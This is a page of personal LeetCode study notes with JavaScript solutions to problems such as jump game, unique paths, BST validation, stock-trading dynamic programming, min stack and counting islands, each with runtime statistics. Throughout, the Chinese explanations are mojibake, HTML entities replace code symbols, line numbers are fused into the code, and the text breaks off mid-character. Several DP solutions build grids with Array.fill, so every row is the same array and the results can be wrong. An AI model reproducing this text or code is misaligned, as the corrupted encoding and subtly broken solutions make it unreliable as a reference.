[2,3,1,1,4]è¾“å‡º: trueè§£é‡Š: ä»Žä½ç½® 0 åˆ° 1 è·³ 1 æ­¥, ç„¶åŽè·³ 3 æ­¥åˆ°è¾¾æœ€åŽä¸€ä¸ªä½ç½®ã€‚ç¤ºä¾‹ 2: è¾“å…¥: [3,2,1,0,4]è¾“å‡º: falseè§£é‡Š: æ— è®ºæ€Žæ ·ï¼Œä½ æ€»ä¼šåˆ°è¾¾ç´¢å¼•ä¸º 3 çš„ä½ç½®ã€‚ä½†è¯¥ä½ç½®çš„æœ€å¤§è·³è·ƒé•¿åº¦æ˜¯ 0 ï¼Œ æ‰€ä»¥ä½ æ°¸è¿œä¸å¯èƒ½åˆ°è¾¾æœ€åŽä¸€ä¸ªä½ç½®ã€‚ 12345678910111213141516171819202122232425var canJump = function(nums) &#123; let length = nums.length; let front = nums[0], behind = 0,temp=0,last=0; while(front&lt;length-1&amp;&amp;last!=front)&#123; last=front temp=behind while(behind&lt;front-1)&#123; behind++ temp=Math.max(temp,behind+nums[behind]) &#125; if(temp&gt;front)&#123; [front,behind]=[front,temp].sort((a,b)=&gt;b-a) &#125;else&#123; behind=front front+=nums[front] &#125; &#125; if(front&gt;=length-1)&#123; return true &#125;else&#123; return false &#125; &#125;; æ‰§è¡Œç”¨æ—¶ :84 ms, åœ¨æ‰€æœ‰ JavaScript æäº¤ä¸­å‡»è´¥äº†66.37%çš„ç”¨æˆ· å†…å­˜æ¶ˆè€— :35.5 MB, åœ¨æ‰€æœ‰ JavaScript æäº¤ä¸­å‡»è´¥äº†57.97%çš„ç”¨æˆ· 62. ä¸åŒè·¯å¾„ä¸€ä¸ªæœºå™¨äººä½äºŽä¸€ä¸ª m x n ç½‘æ ¼çš„å·¦ä¸Šè§’ ï¼ˆèµ·å§‹ç‚¹åœ¨ä¸‹å›¾ä¸­æ ‡è®°ä¸ºâ€œStartâ€ ï¼‰ã€‚ æœºå™¨äººæ¯æ¬¡åªèƒ½å‘ä¸‹æˆ–è€…å‘å³ç§»åŠ¨ä¸€æ­¥ã€‚æœºå™¨äººè¯•å›¾è¾¾åˆ°ç½‘æ ¼çš„å³ä¸‹è§’ï¼ˆåœ¨ä¸‹å›¾ä¸­æ ‡è®°ä¸ºâ€œFinishâ€ï¼‰ã€‚ é—®æ€»å…±æœ‰å¤šå°‘æ¡ä¸åŒçš„è·¯å¾„ï¼Ÿ ç¤ºä¾‹ 1: è¾“å…¥: m = 3, n = 2è¾“å‡º: 3è§£é‡Š:ä»Žå·¦ä¸Šè§’å¼€å§‹ï¼Œæ€»å…±æœ‰ 3 æ¡è·¯å¾„å¯ä»¥åˆ°è¾¾å³ä¸‹è§’ã€‚ å‘å³ -&gt; å‘å³ -&gt; å‘ä¸‹ å‘å³ -&gt; å‘ä¸‹ -&gt; å‘å³ å‘ä¸‹ -&gt; å‘å³ -&gt; å‘å³ 123456var uniquePaths = function(m, n) &#123; if(m==1||n==1)&#123; return 1 &#125; return uniquePaths(m-1,n)+uniquePaths(m,n-1)&#125;; é€’å½’DPï¼Œå®¹æ˜“è¶…æ—¶ï¼ŒäºŒç»´æ•°ç»„è€ƒè™‘è¶Šç•Œé—®é¢˜ 1234567891011121314var uniquePaths = function(m, n) &#123; let dp = []; for(let j=0;j&lt;n;++j)&#123; dp.push([]) for(let i = 0;i&lt;m;++i)&#123; if(i==0||j==0)&#123; dp[j][i]=1 &#125;else&#123; dp[j].push(dp[j][i-1]+dp[j-1][i]) &#125; &#125; &#125; return dp[n-1][m-1]&#125;; DP 12345678910var uniquePaths = function(m, n) &#123; var a= new Array(n).fill(1); var dp=new Array(m).fill(a); for(var i=1; i&lt;m; i++)&#123; for(var j=1; j&lt;n; j++)&#123; dp[i][j]=dp[i-1][j] + dp[i][j-1]; &#125; &#125; return dp[m-1][n-1];&#125;; new Array(n).fill(1) è¿™ä¸ªæ“ä½œçœæ—¶ 63. ä¸åŒè·¯å¾„ IIè¾“å…¥:[ [0,0,0], [0,1,0], [0,0,0]]è¾“å‡º: 2è§£é‡Š:3x3 ç½‘æ ¼çš„æ­£ä¸­é—´æœ‰ä¸€ä¸ªéšœç¢ç‰©ã€‚ä»Žå·¦ä¸Šè§’åˆ°å³ä¸‹è§’ä¸€å…±æœ‰ 2 æ¡ä¸åŒçš„è·¯å¾„ï¼š å‘å³ -&gt; å‘å³ -&gt; å‘ä¸‹ -&gt; å‘ä¸‹ å‘ä¸‹ -&gt; å‘ä¸‹ -&gt; å‘å³ -&gt; å‘å³ 12345678910111213141516171819202122var uniquePathsWithObstacles = function(obstacleGrid) &#123; let m = obstacleGrid.length,n = obstacleGrid[0].length; var a= new Array(n).fill(0); var dp=new Array(m).fill(a); for(let i=0; i&lt;m; i++)&#123; for(let j=0; j&lt;n; j++)&#123; if(i == 0 &amp;&amp; j == 0)&#123; dp[i][j]=1; &#125;else if(i == 0)&#123; dp[i][j]=dp[i][j-1] &#125;else if(j == 0)&#123; dp[i][j]=dp[i-1][j] &#125;else&#123; dp[i][j]=dp[i][j-1]+dp[i-1][j] &#125; if(obstacleGrid[i][j]==1)&#123; dp[i][j]=0 &#125; &#125; &#125; return dp[m-1][n-1];&#125;; let a = new Array(2).fill(0) let b = new Array(K+1).fill(a) let dp = new Array(n).fill(b) fillåˆ›å»ºä¸‰ç»´æ•°ç»„å¸¦æ¥æµ…æ‹·è´çš„é—®é¢˜ï¼ŒArray.fill()å¦‚æžœå¡«å……ç±»åž‹ä¸ºå¯¹è±¡ï¼Œåˆ™ä¸ºæµ…æ‹·è´ã€‚æ•°ç»„å†…çš„å¯¹è±¡æŒ‡å‘çš„éƒ½æ˜¯åŒä¸€ä¸ªå†…å­˜åœ°å€ã€‚ ä½ å¯ä»¥è¿™æ ·åšæ‰§è¡Œç”¨æ—¶ :88 ms, åœ¨æ‰€æœ‰ JavaScript æäº¤ä¸­å‡»è´¥äº†65.92%çš„ç”¨æˆ· å†…å­˜æ¶ˆè€— :34.9 MB, åœ¨æ‰€æœ‰ JavaScript æäº¤ä¸­å‡»è´¥äº†98.31%çš„ç”¨æˆ· 98. éªŒè¯äºŒå‰æœç´¢æ ‘ç»™å®šä¸€ä¸ªäºŒå‰æ ‘ï¼Œåˆ¤æ–­å…¶æ˜¯å¦æ˜¯ä¸€ä¸ªæœ‰æ•ˆçš„äºŒå‰æœç´¢æ ‘ã€‚ å‡è®¾ä¸€ä¸ªäºŒå‰æœç´¢æ ‘å…·æœ‰å¦‚ä¸‹ç‰¹å¾ï¼š èŠ‚ç‚¹çš„å·¦å­æ ‘åªåŒ…å«å°äºŽå½“å‰èŠ‚ç‚¹çš„æ•°ã€‚èŠ‚ç‚¹çš„å³å­æ ‘åªåŒ…å«å¤§äºŽå½“å‰èŠ‚ç‚¹çš„æ•°ã€‚æ‰€æœ‰å·¦å­æ ‘å’Œå³å­æ ‘è‡ªèº«å¿…é¡»ä¹Ÿæ˜¯äºŒå‰æœç´¢æ ‘ã€‚ æ·±æœ123456789101112131415161718192021222324252627var isValidBST = function(root) &#123; if(root == null)&#123; return true &#125; let right = leftest(root.right) let left = rightest(root.left) if (left &amp;&amp; left.val &gt;= root.val) &#123; return false &#125; if (right &amp;&amp; right.val &lt;= root.val) &#123; return false &#125; return isValidBST(root.left) &amp;&amp; isValidBST(root.right)&#125;;function rightest(node)&#123; while(node &amp;&amp; node.right)&#123; node = node.right &#125; return node&#125;function leftest(node)&#123; while(node &amp;&amp; node.left)&#123; node = node.left &#125; return node&#125; å¯¹æ¯”å·¦å­æ ‘æœ€å³èŠ‚ç‚¹å’Œå³å­æ ‘æœ€å·¦èŠ‚ç‚¹ç¡®ä¿å·¦å­æ ‘æ‰€æœ‰å€¼å°äºŽè‡ªèº«ï¼Œå³å¤§äºŽè‡ªèº« æ‰§è¡Œç”¨æ—¶ :112 ms, åœ¨æ‰€æœ‰ JavaScript æäº¤ä¸­å‡»è´¥äº†30.95%çš„ç”¨æˆ· å†…å­˜æ¶ˆè€— :37.4 MB, åœ¨æ‰€æœ‰ JavaScript æäº¤ä¸­å‡»è´¥äº†57.23%çš„ç”¨æˆ· 12345678910var isValidBST = function(root, arr = []) &#123; if (!root) return true; return isValidBST(root.left, arr) &amp;&amp; compareAndPush(root.val, arr) &amp;&amp; isValidBST(root.right, arr);&#125;;function compareAndPush (val, arr) &#123; if (arr.length) if (arr[arr.length - 1] &gt;= val) return false arr.push(val); return true;&#125; ä¸­åºéåŽ†æ–¹æ³• 1234567891011121314/** * @param &#123;TreeNode&#125; root * @param &#123;TreeNode&#125; pre å½“å‰èŠ‚ç‚¹å€¼çš„ä¸‹é™ * @param &#123;TreeNode&#125; next å½“å‰èŠ‚ç‚¹å€¼çš„ä¸Šé™ * @return &#123;boolean&#125; */var isValidBST = function(root, pre = null, next = null) &#123; if (!root) return true; // åœ¨è¿™é‡Œæ‰“å°æ—¥å¿—å¯ä»¥å¾ˆå¥½çš„è§‚å¯Ÿåˆ°éåŽ†é¡ºåºä»¥åŠæ¯ä¸ªèŠ‚ç‚¹åˆ°åº•ä¸Žå“ªäº›ä¸Šä¸‹é™è¿›è¡Œäº†æ¯”è¾ƒ // console.log(root &amp;&amp; root.val, pre &amp;&amp; pre.val, next &amp;&amp; next.val); if (pre &amp;&amp; pre.val &gt;= root.val) return false; if (next &amp;&amp; next.val &lt;= root.val) return false; return isValidBST(root.left, pre, root) &amp;&amp; isValidBST(root.right, root, next);&#125;; å› ä¸ºåœ¨æ¯ä¸ªäºŒå‰æœç´¢æ ‘ä¸­ï¼Œæ ¹èŠ‚ç‚¹çš„å€¼ä¸€å®šæ¯”å·¦å­æ ‘æ‰€æœ‰èŠ‚ç‚¹çš„å€¼å¤§ä¸”ä¸€å®šæ¯”å³å­æ ‘æ‰€æœ‰èŠ‚ç‚¹çš„å€¼å°ã€‚å·§å¦™çš„å°†è¿™äº›ä¸Šä¸‹é™å€¼é€šè¿‡å‡½æ•°é€’å½’ä¼ ç»™å­èŠ‚ç‚¹æ¥è¿›è¡Œæ¯”è¾ƒã€‚é¡ºä¾¿å‘çŽ°äº†è¯¥æ–¹æ³•çš„éåŽ†é¡ºåºå°±æ˜¯å…ˆåºéåŽ† 123456789101112131415161718var isValidBST = function(root) &#123; let data = [] Inorder(root,data) for(let i=0;i+1&lt;data.length;i++)&#123; if(data[i]&gt;=data[i+1]) return false &#125; return true&#125;;function Inorder(root,data)&#123; if(root)&#123; Inorder(root.left,data) data.push(root.val) Inorder(root.right,data) &#125; else return&#125; æœ€å¿«ï¼ŒæŠŠæ ‘å…¨éƒ¨æ‰“å°æˆæ•°ç»„ä»Žå¤´æ¯”è¾ƒè¿‡åŽ» 101. å¯¹ç§°äºŒå‰æ ‘å¹¿æœ123456789101112var isSymmetric = function(root) &#123; return isM(root,root)&#125;;function isM(n1,n2)&#123; if(n1==null&amp;&amp;n2==null)&#123; return true &#125; if(n1==null||n2==null)&#123; return false &#125; return n1.val==n2.val &amp;&amp; isM(n1.left,n2.right) &amp;&amp; isM(n1.right,n2.left)&#125; æ‰§è¡Œç”¨æ—¶ :88 ms, åœ¨æ‰€æœ‰ JavaScript æäº¤ä¸­å‡»è´¥äº†72.72%çš„ç”¨æˆ· å†…å­˜æ¶ˆè€— :35.4 MB, åœ¨æ‰€æœ‰ JavaScript æäº¤ä¸­å‡»è´¥äº†53.38%çš„ç”¨æˆ· 121. ä¹°å–è‚¡ç¥¨çš„æœ€ä½³æ—¶æœºä½Žè¿›é«˜å‡º 12345678910111213var maxProfit = function(prices) &#123; let low = prices[0],high = prices[0],profit = 0; prices.forEach((ele)=&gt;&#123; if(ele&lt;low)&#123; low = ele high = ele &#125;else if(ele&gt;high)&#123; high = ele profit = Math.max(profit,high-low) &#125; &#125;) return profit&#125;; for of æ¯” forEachæ›´è€—ç©ºé—´ä¸€äº›ï¼Œæ—¶é—´ä¸Šæœ‰éšæœºçš„å¯èƒ½ æ‰§è¡Œç”¨æ—¶ :72 ms, åœ¨æ‰€æœ‰ JavaScript æäº¤ä¸­å‡»è´¥äº†98.04%çš„ç”¨æˆ· å†…å­˜æ¶ˆè€— :35 MB, åœ¨æ‰€æœ‰ JavaScript æäº¤ä¸­å‡»è´¥äº†92.95%çš„ç”¨æˆ· 122. ä¹°å–è‚¡ç¥¨çš„æœ€ä½³æ—¶æœº IIå¤šç¬”äº¤æ˜“ 12345678910111213141516var maxProfit = function(prices) &#123; let low = prices[0],high = prices[0],profit = 0,total = 0; for(let ele of prices)&#123; if(ele&gt;high)&#123; high = ele profit = Math.max(profit,high-low) &#125;else&#123; total +=profit; profit = 0; low = ele high = ele &#125; &#125; total +=profit return total&#125;; æ‰§è¡Œç”¨æ—¶ :88 ms, åœ¨æ‰€æœ‰ JavaScript æäº¤ä¸­å‡»è´¥äº†51.61%çš„ç”¨æˆ· å†…å­˜æ¶ˆè€— :36.3 MB, åœ¨æ‰€æœ‰ JavaScript æäº¤ä¸­å‡»è´¥äº†7.56%çš„ç”¨æˆ· 123. ä¹°å–è‚¡ç¥¨çš„æœ€ä½³æ—¶æœº IIIé™åˆ¶äº¤æ˜“æ¬¡æ•° çŠ¶æ€è½¬ç§»æ–¹ç¨‹æ¯å¤©éƒ½æœ‰ä¸‰ç§ã€Œé€‰æ‹©ã€ï¼šä¹°å…¥ã€å–å‡ºã€æ— æ“ä½œ è¿™ä¸ªé—®é¢˜çš„ã€ŒçŠ¶æ€ã€æœ‰ä¸‰ä¸ªï¼Œç¬¬ä¸€ä¸ªæ˜¯å¤©æ•°ï¼Œç¬¬äºŒä¸ªæ˜¯å…è®¸äº¤æ˜“çš„æœ€å¤§æ¬¡æ•°ï¼Œç¬¬ä¸‰ä¸ªæ˜¯å½“å‰çš„æŒæœ‰çŠ¶æ€ https://leetcode-cn.com/problems/best-time-to-buy-and-sell-stock-iii/solution/yi-ge-tong-yong-fang-fa-tuan-mie-6-dao-gu-piao-wen/ 123456789101112dp[i][k][0 or 1]0 &lt;= i &lt;= n-1, 1 &lt;= k &lt;= Kn ä¸ºå¤©æ•°ï¼Œå¤§ K ä¸ºæœ€å¤šäº¤æ˜“æ•°æ­¤é—®é¢˜å…± n Ã— K Ã— 2 ç§çŠ¶æ€ï¼Œå…¨éƒ¨ç©·ä¸¾å°±èƒ½æžå®šã€‚for(let i=0; i&lt;n; i++)&#123; for(let k=K; k&gt;=1; k--)&#123; for(let s=0; s&lt;2; s++)&#123; dp[i][k][s] = max(buy, sell, rest) &#125; &#125;&#125; æˆ‘ä»¬æƒ³æ±‚çš„æœ€ç»ˆç­”æ¡ˆæ˜¯ dp ã€n - 1ã€‘ã€ Kã€‘ã€0ã€‘ï¼Œå³æœ€åŽä¸€å¤©ï¼Œæœ€å¤šå…è®¸ K æ¬¡äº¤æ˜“ï¼Œæœ€å¤šèŽ·å¾—å¤šå°‘åˆ©æ¶¦ã€‚è¯»è€…å¯èƒ½é—®ä¸ºä»€ä¹ˆä¸æ˜¯dp ã€n - 1ã€‘ã€ Kã€‘ã€1ã€‘ï¼Ÿå› ä¸º [1] ä»£è¡¨æ‰‹ä¸Šè¿˜æŒæœ‰è‚¡ç¥¨ï¼Œ[0] è¡¨ç¤ºæ‰‹ä¸Šçš„è‚¡ç¥¨å·²ç»å–å‡ºåŽ»äº†ï¼Œå¾ˆæ˜¾ç„¶åŽè€…å¾—åˆ°çš„åˆ©æ¶¦ä¸€å®šå¤§äºŽå‰è€…ã€‚ çŽ°åœ¨ï¼Œæˆ‘ä»¬å®Œæˆäº†ã€ŒçŠ¶æ€ã€çš„ç©·ä¸¾ï¼Œæˆ‘ä»¬å¼€å§‹æ€è€ƒæ¯ç§ã€ŒçŠ¶æ€ã€æœ‰å“ªäº›ã€Œé€‰æ‹©ã€ï¼Œåº”è¯¥å¦‚ä½•æ›´æ–°ã€ŒçŠ¶æ€ã€ã€‚åªçœ‹ã€ŒæŒæœ‰çŠ¶æ€ã€ï¼Œå¯ä»¥ç”»ä¸ªçŠ¶æ€è½¬ç§»å›¾ã€‚ é€šè¿‡è¿™ä¸ªå›¾å¯ä»¥å¾ˆæ¸…æ¥šåœ°çœ‹åˆ°ï¼Œæ¯ç§çŠ¶æ€ï¼ˆ0 å’Œ 1ï¼‰æ˜¯å¦‚ä½•è½¬ç§»è€Œæ¥çš„ã€‚æ ¹æ®è¿™ä¸ªå›¾ï¼Œæˆ‘ä»¬æ¥å†™ä¸€ä¸‹çŠ¶æ€è½¬ç§»æ–¹ç¨‹ï¼š 1234567891011121314dp[i][k][0] = max(dp[i-1][k][0], dp[i-1][k][1] + prices[i]) max(é€‰æ‹© rest,é€‰æ‹© sell)è§£é‡Šï¼šä»Šå¤©æˆ‘æ²¡æœ‰æŒæœ‰è‚¡ç¥¨ï¼Œæœ‰ä¸¤ç§å¯èƒ½ï¼šè¦ä¹ˆæ˜¯æˆ‘æ˜¨å¤©å°±æ²¡æœ‰æŒæœ‰ï¼Œç„¶åŽä»Šå¤©é€‰æ‹© restï¼Œæ‰€ä»¥æˆ‘ä»Šå¤©è¿˜æ˜¯æ²¡æœ‰æŒæœ‰ï¼›è¦ä¹ˆæ˜¯æˆ‘æ˜¨å¤©æŒæœ‰è‚¡ç¥¨ï¼Œä½†æ˜¯ä»Šå¤©æˆ‘ sell äº†ï¼Œæ‰€ä»¥æˆ‘ä»Šå¤©æ²¡æœ‰æŒæœ‰è‚¡ç¥¨äº†ã€‚dp[i][k][1] = max(dp[i-1][k][1], dp[i-1][k-1][0] - prices[i]) max(é€‰æ‹© rest,é€‰æ‹© buy)è§£é‡Šï¼šä»Šå¤©æˆ‘æŒæœ‰ç€è‚¡ç¥¨ï¼Œæœ‰ä¸¤ç§å¯èƒ½ï¼šè¦ä¹ˆæˆ‘æ˜¨å¤©å°±æŒæœ‰ç€è‚¡ç¥¨ï¼Œç„¶åŽä»Šå¤©é€‰æ‹© restï¼Œæ‰€ä»¥æˆ‘ä»Šå¤©è¿˜æŒæœ‰ç€è‚¡ç¥¨ï¼›è¦ä¹ˆæˆ‘æ˜¨å¤©æœ¬æ²¡æœ‰æŒæœ‰ï¼Œä½†ä»Šå¤©æˆ‘é€‰æ‹© buyï¼Œæ‰€ä»¥ä»Šå¤©æˆ‘å°±æŒæœ‰è‚¡ç¥¨äº†ã€‚æ³¨æ„ k çš„é™åˆ¶ï¼Œæˆ‘ä»¬åœ¨é€‰æ‹© buy çš„æ—¶å€™ï¼ŒæŠŠ k å‡å°äº† 1ï¼Œå¾ˆå¥½ç†è§£å§ï¼Œå½“ç„¶ä½ ä¹Ÿå¯ä»¥åœ¨ sellçš„æ—¶å€™å‡ 1ã€‚ è¿˜å·®æœ€åŽä¸€ç‚¹ç‚¹ï¼Œå°±æ˜¯å®šä¹‰ base caseï¼Œå³æœ€ç®€å•çš„æƒ…å†µã€‚ 123base caseï¼šdp[-1][k][0] = dp[i][0][0] = 0dp[-1][k][1] = dp[i][0][1] = -infinity 12345678910111213141516171819var maxProfit = function(prices) &#123; if(prices.length==0)&#123; return 0 &#125; let n = prices.length,K = 2; let dp = new Array(n).fill([[0,0],[0,0],[0,0]]) for(let i=0; i&lt;n; i++)&#123; for(let k=K; k&gt;0; k--)&#123; if(i==0)&#123; dp[i][k][0] = 0; dp[i][k][1] = 0-prices[i]; continue; &#125; dp[i][k][0] = Math.max(dp[i-1][k][0], dp[i-1][k][1] + prices[i]) dp[i][k][1] = Math.max(dp[i-1][k][1], dp[i-1][k-1][0]-prices[i]) &#125; &#125; return dp[n-1][K][0]&#125;; 123456789//[3,3,5,0,0,3,1,4][ [ [ 0, 0 ], [ 4, 0 ], [ 6, 2 ] ], [ [ 0, 0 ], [ 4, 0 ], [ 6, 2 ] ], [ [ 0, 0 ], [ 4, 0 ], [ 6, 2 ] ], [ [ 0, 0 ], [ 4, 0 ], [ 6, 2 ] ], [ [ 0, 0 ], [ 4, 0 ], [ 6, 2 ] ], [ [ 0, 0 ], [ 4, 0 ], [ 6, 2 ] ], [ [ 0, 0 ], [ 4, 0 ], [ 6, 2 ] ], [ [ 0, 0 ], [ 4, 0 ], [ 6, 2 ] ] ] 12345678910111213141516var maxProfit = function(prices) &#123; if(prices.length===0)&#123; return 0 &#125; // è®¾ç½®åŸºç¡€æ¡ä»¶ var dp10=0,dp20=0 var dp11=-prices[0], dp21 = -prices[0] for(let i=1;i&lt;prices.length;i++)&#123; dp11=Math.max(dp11,-prices[i]) dp10=Math.max(dp10,dp11+prices[i]) //æ­¤è¡Œå®ŒæˆçŠ¶æ€è½¬ç§» dp21=Math.max(dp21,dp10-prices[i]) dp20=Math.max(dp20,dp21+prices[i]) &#125; return dp20&#125;; å¾ªçŽ¯æ‰§è¡Œé¿å…åˆ›å»ºæ•°ç»„çš„è€—æ—¶ æ‰§è¡Œç”¨æ—¶ :96 ms, åœ¨æ‰€æœ‰ JavaScript æäº¤ä¸­å‡»è´¥äº†63.11%çš„ç”¨æˆ· å†…å­˜æ¶ˆè€— :36.4 MB, åœ¨æ‰€æœ‰ JavaScript æäº¤ä¸­å‡»è´¥äº†53.33%çš„ç”¨æˆ· 155. æœ€å°æ ˆ123456789101112131415161718192021222324252627282930313233343536373839404142434445/** * initialize your data structure here. */var MinStack = function() &#123; this.stack = new Array()&#125;;/** * @param &#123;number&#125; x * @return &#123;void&#125; */MinStack.prototype.push = function(x) &#123; this.stack[this.stack.length]=x&#125;;/** * @return &#123;void&#125; */MinStack.prototype.pop = function() &#123; this.stack[this.stack.length-1]=null this.stack.length--&#125;;/** * @return &#123;number&#125; */MinStack.prototype.top = function() &#123; return this.stack[this.stack.length-1]&#125;;/** * @return &#123;number&#125; */MinStack.prototype.getMin = function() &#123; return Math.min(...this.stack)&#125;;/** * Your MinStack object will be instantiated and called as such: * var obj = new MinStack() * obj.push(x) * obj.pop() * var param_3 = obj.top() * var param_4 = obj.getMin() */ æ‰§è¡Œç”¨æ—¶ :356 ms, åœ¨æ‰€æœ‰ JavaScript æäº¤ä¸­å‡»è´¥äº†10.05%çš„ç”¨æˆ· å†…å­˜æ¶ˆè€— :44.3 MB, åœ¨æ‰€æœ‰ JavaScript æäº¤ä¸­å‡»è´¥äº†38.10%çš„ç”¨æˆ· 123456789101112131415161718192021222324var MinStack = function() &#123; this.val = []; this.min = Infinity; this.top;&#125;;MinStack.prototype.push = function(x) &#123; this.val.push(x); this.min = this.min &gt; x ? x : this.min; this.topVal = x;&#125;;MinStack.prototype.pop = function() &#123; var popVal = this.val.pop(); if(this.min === popVal) &#123; this.min = Math.min(...this.val); &#125; this.topVal = this.val[this.val.length - 1]; return popVal;&#125;;MinStack.prototype.top = function() &#123; return this.topVal;&#125;;MinStack.prototype.getMin = function() &#123; return this.min;&#125;; åœ¨pushæ˜¯ç¡®å®šæœ€å°å¯æå‡getMin æ€§èƒ½ 169. æ±‚ä¼—æ•°ä¼—æ•°æ˜¯æŒ‡åœ¨æ•°ç»„ä¸­å‡ºçŽ°æ¬¡æ•°å¤§äºŽ âŒŠ n/2 âŒ‹ çš„å…ƒç´ ã€‚ 123456789101112131415161718var majorityElement = function(nums) &#123; let map = new Map(),length = nums.length; for(let i = 0;i&lt;length;i++)&#123; if(map.has(nums[i]))&#123; map.set(nums[i],map.get(nums[i])+1) &#125;else&#123; map.set(nums[i],1) &#125; &#125; let maxValue,maxKey for(let [key,value] of map)&#123; if(!maxValue || maxValue &lt; value) &#123; maxValue = value maxKey = key &#125; &#125; return maxKey&#125;; æ‰§è¡Œç”¨æ—¶ :132 ms, åœ¨æ‰€æœ‰ JavaScript æäº¤ä¸­å‡»è´¥äº†20.61%çš„ç”¨æˆ· å†…å­˜æ¶ˆè€— :37.7 MB, åœ¨æ‰€æœ‰ JavaScript æäº¤ä¸­å‡»è´¥äº†29.33%çš„ç”¨æˆ· å“ˆå¸Œè¡¨æ³• 12345678910111213141516var majorityElement = function (nums) &#123; if (nums.length === 1) &#123; return nums[0]; &#125; const map = new Map(); for (let num of nums) &#123; if (!map.get(num)) &#123; map.set(num, 1); &#125; else &#123; map.set(num, map.get(num) + 1); if (map.get(num) &gt; nums.length / 2) &#123; return num; &#125; &#125; &#125;&#125;; æ ˆ ä½è¿ç®— å¼‚ä½ç›¸æ¶ˆ 188. ä¹°å–è‚¡ç¥¨çš„æœ€ä½³æ—¶æœº IV1234567891011121314151617181920212223var maxProfit = function (k, prices) &#123; let n = prices.length; if(n==0)&#123; return 0 &#125; if(k&gt;n/2)&#123; let ans = 0 for(let i=0;i&lt;n-1;i++)&#123; ans = Math.max(ans,ans+prices[i+1]-prices[i]) &#125; return ans &#125;else&#123; let dp0 = new Array(k+1).fill(0) let dp1 = new Array(k+1).fill(-prices[0]) for(let i = 1;i&lt;n;i++)&#123; for(let j = 1;j&lt;k+1;j++)&#123; dp0[j]=Math.max(dp0[j],dp1[j]+prices[i]) dp1[j]=Math.max(dp1[j],dp0[j-1]-prices[i]) &#125; &#125; return dp0[k] &#125;&#125;; k&gt;n/2è·Ÿä¸é™æ¬¡æ•°äº¤æ˜“ä¸€æ · æ‰§è¡Œç”¨æ—¶ :88 ms, åœ¨æ‰€æœ‰ JavaScript æäº¤ä¸­å‡»è´¥äº†93.75%çš„ç”¨æˆ· å†…å­˜æ¶ˆè€— :35.2 MB, åœ¨æ‰€æœ‰ JavaScript æäº¤ä¸­å‡»è´¥äº†100.00%çš„ç”¨æˆ· 200. å²›å±¿æ•°é‡ç»™å®šä¸€ä¸ªç”± â€˜1â€™ï¼ˆé™†åœ°ï¼‰å’Œ â€˜0â€™ï¼ˆæ°´ï¼‰ç»„æˆçš„çš„äºŒç»´ç½‘æ ¼ï¼Œè®¡ç®—å²›å±¿çš„æ•°é‡ã€‚ä¸€ä¸ªå²›è¢«æ°´åŒ…å›´ï¼Œå¹¶ä¸”å®ƒæ˜¯é€šè¿‡æ°´å¹³æ–¹å‘æˆ–åž‚ç›´æ–¹å‘ä¸Šç›¸é‚»çš„é™†åœ°è¿žæŽ¥è€Œæˆçš„ã€‚ä½ å¯ä»¥å‡è®¾ç½‘æ ¼çš„å››ä¸ªè¾¹å‡è¢«æ°´åŒ…å›´ã€‚ ç¤ºä¾‹ 1: è¾“å…¥:11110110101100000000 è¾“å‡º: 1 12345678910111213141516171819202122232425262728293031323334/** * @param &#123;character[][]&#125; grid * @return &#123;number&#125; */var numIslands = function(grid) &#123; if(grid.length==0||grid[0].length==0)&#123; return 0 &#125; let count=0; for(let i=0;i&lt;grid.length;i++)&#123; for(let j=0;j&lt;grid[0].length;j++)&#123; if(grid[i][j]==1)&#123; count++ islandClean(i,j,grid) &#125; &#125; &#125; function islandClean(i,j)&#123; grid[i][j]=0 if(j+1&lt;grid[0].length&amp;&amp;grid[i][j+1]==1)&#123; islandClean(i,j+1) &#125; if(i+1&lt;grid.length&amp;&amp;grid[i+1][j]==1)&#123; islandClean(i+1,j) &#125; if(j-1&gt;=0&amp;&amp;grid[i][j-1]==1)&#123; islandClean(i,j-1) &#125; if(i-1&gt;=0&amp;&amp;grid[i-1][j]==1)&#123; islandClean(i-1,j) &#125; &#125; return count&#125;; æ„ŸæŸ“æ³•ï¼ŒæŠŠè®¡æ•°å²›å±¿éƒ¨åˆ†å…¨éƒ¨å½’é›¶ æ‰§è¡Œç”¨æ—¶ :84 ms, åœ¨æ‰€æœ‰ JavaScript æäº¤ä¸­å‡»è´¥äº†93.77%çš„ç”¨æˆ· å†…å­˜æ¶ˆè€— :37.8 MB, åœ¨æ‰€æœ‰ JavaScript æäº¤ä¸­å‡»è´¥äº†50.50%çš„ç”¨æˆ· 215. æ•°ç»„ä¸­çš„ç¬¬Kä¸ªæœ€å¤§å…ƒç´ 1234567891011var findKthLargest = function(nums, k) &#123; let arr = nums.slice(0,k),len = nums.length; arr.sort((a,b)=&gt;a-b) for(let i=k;i&lt;len;i++)&#123; if(nums[i]&gt;arr[0])&#123; arr[0]=nums[i] arr.sort((a,b)=&gt;a-b) &#125; &#125; return arr[0]&#125;; æ‰§è¡Œç”¨æ—¶ :372 ms, åœ¨æ‰€æœ‰ JavaScript æäº¤ä¸­å‡»è´¥äº†7.31%çš„ç”¨æˆ· å†…å­˜æ¶ˆè€— :38.4 MB, åœ¨æ‰€æœ‰ JavaScript æäº¤ä¸­å‡»è´¥äº†7.19%çš„ç”¨æˆ· 292. Nim æ¸¸æˆä½ å’Œä½ çš„æœ‹å‹ï¼Œä¸¤ä¸ªäººä¸€èµ·çŽ© Nim æ¸¸æˆï¼šæ¡Œå­ä¸Šæœ‰ä¸€å †çŸ³å¤´ï¼Œæ¯æ¬¡ä½ ä»¬è½®æµæ‹¿æŽ‰ 1 - 3 å—çŸ³å¤´ã€‚ æ‹¿æŽ‰æœ€åŽä¸€å—çŸ³å¤´çš„äººå°±æ˜¯èŽ·èƒœè€…ã€‚ä½ ä½œä¸ºå…ˆæ‰‹ã€‚ ä½ ä»¬æ˜¯èªæ˜Žäººï¼Œæ¯ä¸€æ­¥éƒ½æ˜¯æœ€ä¼˜è§£ã€‚ ç¼–å†™ä¸€ä¸ªå‡½æ•°ï¼Œæ¥åˆ¤æ–­ä½ æ˜¯å¦å¯ä»¥åœ¨ç»™å®šçŸ³å¤´æ•°é‡çš„æƒ…å†µä¸‹èµ¢å¾—æ¸¸æˆã€‚ å¦‚æžœæœ‰äº”å—ã€å…­å—ã€æˆ–æ˜¯ä¸ƒå—çŸ³å¤´ï¼Œä½ å¯ä»¥æŽ§åˆ¶è‡ªå·±æ‹¿å–çš„çŸ³å¤´æ•°ï¼Œæ€»æ˜¯æ°å¥½ç»™ä½ çš„å¯¹æ‰‹ç•™ä¸‹å››å—çŸ³å¤´ï¼Œä½¿ä»–è¾“æŽ‰è¿™åœºæ¯”èµ›ã€‚ä½†æ˜¯å¦‚æžœçŸ³å¤´å 